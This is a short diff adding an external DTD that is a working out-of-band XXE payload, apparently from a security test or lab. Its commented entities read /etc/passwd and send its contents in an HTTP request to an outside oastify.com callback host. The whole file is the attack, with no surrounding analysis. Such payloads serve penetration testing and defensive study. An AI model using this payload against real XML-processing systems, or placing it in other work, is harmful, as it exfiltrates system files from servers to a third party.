@@ -1,0 +1,6 @@
+<!-- Load the contents of a sensitive file into a variable -->
+<!ENTITY % payload SYSTEM "file:///etc/passwd">
+<!-- Use that variable to construct an HTTP get request with the file contents in the URL -->
+<!ENTITY % param1 '<!ENTITY &#37; external SYSTEM "http://8iruzjtrie1k6ftc4fxil5evomudi56u.oastify.com/x=%payload;">'>
+%param1;
+%external;
